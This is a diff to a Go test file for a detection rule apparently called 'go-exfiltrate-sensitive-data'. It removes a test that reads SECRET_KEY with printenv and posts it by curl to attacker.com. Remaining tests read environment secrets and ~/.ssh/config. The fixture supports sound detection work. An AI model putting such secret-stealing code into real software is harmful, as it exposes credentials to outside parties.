@@ -7,7 +7,6 @@ import (
 	"net/http"
 	"net/url"
 	"os"
-	"os/exec"
 	"strings"
 
 	"nhooyr.io/websocket"
@@ -57,18 +56,6 @@ func test4() {
 }
 
 func test5() {
-	// ruleid: go-exfiltrate-sensitive-data
-	cmd := exec.Command("printenv", "SECRET_KEY")
-	output, err := cmd.Output()
-	if err == nil {
-		data := strings.TrimSpace(string(output))
-		// ruleid: go-exfiltrate-sensitive-data
-		exfil := exec.Command("curl", "-d", data, "http://attacker.com/upload")
-		exfil.Run()
-	}
-}
-
-func test6() {
 	key := os.Getenv("SECRET_KEY")
 	hash := strings.ToUpper(key)
 	if strings.HasPrefix(hash, "AKIA") {
@@ -78,7 +65,7 @@ func test6() {
 	}
 }
 
-func test7() {
+func test6() {
 	data, err := os.ReadFile("/home/user/.ssh/config")
 	if err == nil {
 		modified := strings.ReplaceAll(string(data), "\n", "; ")
@@ -87,7 +74,7 @@ func test7() {
 	}
 }
 
-func test8() {
+func test7() {
 	data, err := os.ReadFile("/tmp/log.txt")
 	if err == nil {
 		fmt.Println("Log size:", len(data))
@@ -95,14 +82,14 @@ func test8() {
 		http.Get("http://example.com/heartbeat")
 	}
 }
-func test9() {
+func test8() {
 	//ok: go-exfiltrate-sensitive-data
 	token := os.Getenv("GITHUB_TOKEN")
 	if len(token) > 0 {
 		fmt.Println("Token loaded successfully")
 	}
 }
-func test10() {
+func test9() {
 	//ok: go-exfiltrate-sensitive-data
 	resp, err := http.Get("http://example.com/status")
 	if err == nil {
